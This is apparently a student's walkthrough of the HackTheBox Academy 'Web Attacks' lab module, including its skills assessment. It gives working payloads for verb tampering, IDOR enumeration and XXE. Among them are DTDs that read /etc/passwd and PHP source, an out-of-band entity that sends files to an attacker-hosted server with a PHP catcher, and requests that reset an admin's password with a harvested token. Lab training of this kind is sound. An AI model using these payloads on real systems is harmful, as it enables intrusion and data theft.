# Web Application Attacks  

>My [Burp Suite Certified Practitioner Study material](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md) cover some of the same topics listed here, with more detail.  
>[HackTheBox Academy Web Attacks](https://academy.hackthebox.com/module/134/section/1158)  

## HTTP Verb Tampering

>HTTP has 9 different [verbs](https://academy.hackthebox.com/module/134/section/1159) that can be accepted as HTTP methods by web servers.  
>[HTTP Request Methods Mozilla Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)  

### HTTP Methods  
```
GET
HEAD
POST
PUT
DELETE
CONNECT
OPTIONS
PATCH
TRACE
```  

>[Bypassing Basic Authentication](https://academy.hackthebox.com/module/134/section/1175)  


  
| **Command**   | **Description**   |
| --------------|-------------------|
| `-X OPTIONS` | Set HTTP Method with Curl |

## IDOR

>[Insecure Direct Object References (IDOR)](https://academy.hackthebox.com/module/134/section/1179) vulnerabilities.

### Identify IDORS  

>[Identifying IDORs](https://academy.hackthebox.com/module/134/section/1180)  
>[BSCP IDOR Notes](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md#access-control)  

- In `URL parameters & APIs`
- In `AJAX Calls`
- By `understanding reference hashing/encoding`
- By `comparing user roles`

| **Command**   | **Description**   |
| --------------|-------------------|
| `md5sum` | MD5 hash a string |
| `base64` | Base64 encode a string |

>IDOR Mass Enumeration bash script to create MD5 payloads.  

```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```  


## XXE  

>[Intro to XXE Injections](https://academy.hackthebox.com/module/134/section/1203)  
>[BSCP XXE Notes](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md#xxe-injections)  

### Identify XXE  

>By adding the below XML code to the POST request in the XML body, and then calling the entity, `&fuzzer;` in field value.
>If reflected or executed blind then positively identified XXE.  

```xml
<!DOCTYPE email [
  <!ENTITY fuzzer "Inlane Freight">
]>
```  
  
| **Code**   | **Description**   |
| --------------|-------------------|
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` | Define External Entity to a URL |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Define External Entity to a file path |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter |
| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` | Reading a file through a PHP error |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` | Reading a file OOB exfiltration |

# Web Attack Exercises  

>Try to use what you learned in [Bypassing Basic Authentication](https://academy.hackthebox.com/module/134/section/1175) section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag.  

![web-attack-auth-bypass-header](/images/web-attack-auth-bypass-header.png)  

>To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./  

>Change the GET method to POST to [bypass security filters](https://academy.hackthebox.com/module/134/section/1178).  

![web-attack-Bypassing-Security-Filters](/images/web-attack-Bypassing-Security-Filters.png)  

>Repeat what you learned in [Mass IDOR Enumeration](https://academy.hackthebox.com/module/134/section/1186) section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.  

![web-attack-IDOR-employee-uid](/images/web-attack-IDOR-employee-uid.png)  

>Intruder with grep for `txt` sniper attack on uid value `1..20`.

![web-attack-IDOR-intruder-flag](/images/web-attack-IDOR-intruder-flag.png)  

>[Bypassing Encoded References](https://academy.hackthebox.com/module/134/section/1187) Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.  

![web-attack-IDOR-Bypassing-Encoded-References](/images/web-attack-IDOR-Bypassing-Encoded-References.png)  

>URL Encode the characters of the payload for the intruder attack above.  

>[IDOR in Insecure APIs](https://academy.hackthebox.com/module/134/section/1201) Try to read the details of the user with 'uid=5'. What is their 'uuid' value?  

>Intercept `Update Profile` request in Burp.  

![web-attack-IDOR-apis](/images/web-attack-IDOR-apis.png)  

>[Chaining IDOR Vulnerabilities](https://academy.hackthebox.com/module/134/section/1200) - Change the admin's email to `flag@idor.htb`, and you should get the flag on the 'edit profile' page.

![web-attack-Chaining-IDOR-Vulnerabilities](/images/web-attack-Chaining-IDOR-Vulnerabilities.png)  

>Create new `PUT` request with the information from the GET request above, and replace JSON field value of email.  

```HTML
PUT /profile/api.php/profile/10 HTTP/1.1
Host: 94.237.56.76:38781
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/json
Content-Length: 179
Connection: close
Cookie: role=employee

{
 "uid":"10","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"flag@idor.htb","about":"Never gonna give you up, Never gonna let you down"
}
```  

>[Local File Disclosure and source code](https://academy.hackthebox.com/module/134/section/1204) - Read the source code content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.  

![xxe identify](/images/xxe-identify.png)  

>Insert the following XML code:  

```xml
<!DOCTYPE email [
  <!ENTITY fuzzer SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
```  

>Add the following entity, `&fuzzer;` into the email field that is reflected and print the base64 encode source code of the `connection.php` file.  

![xxe-reading-source-code](/images/xxe-reading-source-code.png)  

>[Advanced File Disclosure](https://academy.hackthebox.com/module/134/section/1206) - Use either XXE methods to read the flag at `/flag.php`.
>Options - use the CDATA method at '/index.php', or the error-based method at `/error`).  

>Error Based XXE, but entering invalid entity value, and then the response reveal the server web folder path as, `/var/www/html/error/submitDetails.php`.

>Host `error.dtd` on Kali http web server.

```XML
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```  

![xxe-error-based-source](/images/xxe-error-based-source.png)  

>The request to the back end server with the below xml code header doctype section, and calling a incorrect entity `&nonExistingEntity;`:  

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.15.38:8000/error.dtd">
  %remote;
  %error;
]>
```

>Using Blind Data Exfiltration on the `/blind` page to read the content of `/327a6c4304ad5938eaf0efb6cc3e53dc.php` and get the flag.  
>[DTD Blind Out-of-band](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md#dtd-blind-out-of-band) BSCP Notes.  

>blind.dtd  

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.15.38:80/?content=%file;'>">
```  

>index.php  

```php               
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```  

>Hosting XML DTD Exploit server to receive incoming blind response from target contain base64 file string.  

```
php -S 0.0.0.0:80
```  

>Request with XXE payload:  

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.15.38:80/blind.dtd">
  %remote;
  %oob;
]>
<root>
&content;
</root>
```    

>Burp Suite Request send the blind xxe payload and php hosted exploit server receive the base64 file contents.  
  
# Web Attacks - Skills Assessment  

>[Scenario](https://academy.hackthebox.com/module/134/section/1219) You are performing a web application penetration test for a software development company, 
>and they task you with testing the latest build of their social networking web application. 
>The login details are provided to `94.237.49.11` with user `htb-student` and password `Academy_student!`.  

>Objective -  Escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.

## Foothold  

![web-attack-skills-assessment](/images/web-attack-skills-assessment.png)  

>Enumeration of uid's, discovered administrator account as `52`. No authentication cookie required.  

```
GET /api.php/user/§52§ HTTP/1.1
Host: 94.237.49.11:42268
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36
Accept: */*
Referer: http://94.237.49.11:42268/profile.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```  

![web-attack-skills-assessment-enum-admin-user](/images/web-attack-skills-assessment-enum-admin-user.png)  

>Get admin token using the request, `GET /api.php/token/52 HTTP/1.1}` and receiving the response is `{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}`  

```
{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
```  

>Source code from `http://94.237.49.11:42268/settings.php` show password reset check for POST HTTP Verb.  

![web-attack-skills-assessment-source-code](/images/web-attack-skills-assessment-source-code.png)   

## Privilege Escalation  

Change to GET request and move web parameters.

![web-attack-skills-assessment-password-changed](/images/web-attack-skills-assessment-password-changed.png)  


```
GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=password HTTP/1.1
```

>Credentials for administrator: `a.corrales`:`password`.  

## Data Exfiltration  

>Enumeration as administrator indicated new function at `http://94.237.49.11:42268/event.php`.

![web-attack-skills-assessment-admin-events](/images/web-attack-skills-assessment-admin-events.png)  

>Validate if can read system file.  

```xml
<!DOCTYPE name [<!ENTITY fuzz SYSTEM "file:///etc/passwd">]>
            <root>
            <name>&fuzz;</name>
            <details>fuzzing</details>
            <date>2023-07-26</date>
            </root>
```

>To Read the flag at '/flag.php' below [PHP Filter convert base64 encode resource method](https://academy.hackthebox.com/module/134/section/1204).  

```xml
<!DOCTYPE name [<!ENTITY fuzz SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">]>
            <root>
            <name>&fuzz;</name>
            <details>fuzzing</details>
            <date>2023-07-26</date>
            </root>
```  
